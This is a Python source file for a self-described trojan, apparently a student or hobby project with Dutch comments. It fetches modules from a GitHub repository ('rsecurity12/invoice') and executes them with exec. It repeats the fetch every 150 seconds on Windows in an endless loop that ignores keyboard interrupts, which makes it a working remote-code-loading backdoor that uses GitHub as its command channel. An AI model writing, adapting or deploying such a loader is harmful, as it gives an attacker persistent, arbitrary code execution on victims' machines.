
import importlib
import requests
import platform
import time
from github import Github
import os
import subprocess
import re

class Trojan:
    def __init__(self):
        self.run_OSChecker()
   
    def launch_attack(self):
        ACCESS_TOKEN =""
        g = Github(ACCESS_TOKEN)
        OWNER = "rsecurity12"
        REPO_NAME = "invoice"
        FILE_PATH = "Configuration"
        try:
            repo = g.get_repo(f"{OWNER}/{REPO_NAME}")
            file_content = repo.get_contents(FILE_PATH)
            script = file_content.decoded_content.decode().strip()
            module_url = f'https://raw.githubusercontent.com/{OWNER}/{REPO_NAME}/main/modules/{script}'
            module_response = requests.get(module_url)
            if module_response.status_code == 200:
                module_code = module_response.text.strip()
                module_name = module_url.split("/")[-1].split(".")[0]
                module = compile(module_code, module_name, "exec")
                exec(module)
        except Exception as e:
            print(e)
                 
    def run_OSChecker(self):
        '''Beschrijving'''
        OSChecker_url = 'https://raw.githubusercontent.com/rsecurity12/invoice/main/modules/OSChecker.py'
        OSChecker_text = requests.get(OSChecker_url).text
        OSChecker_spec = importlib.util.spec_from_loader("OSChecker", loader=None)
        OSChecker = importlib.util.module_from_spec(OSChecker_spec)
        exec(OSChecker_text, OSChecker.__dict__)
        OSChecker.OSChecker("OSChecker")

    def run_trojan(self):
        '''beschrijving'''
        system = platform.system()
        while True:
            try:
                if system == 'Windows':
                   print("blabla")   # dit moet weg
                   self.launch_attack()
                elif system == 'Linux':
                   print("function")   # self.run_in_background_linux()
                time.sleep(150)  # Delay for 5 minutes (300 seconds)
            except KeyboardInterrupt:
                pass

trojan = Trojan()
trojan.run_trojan()

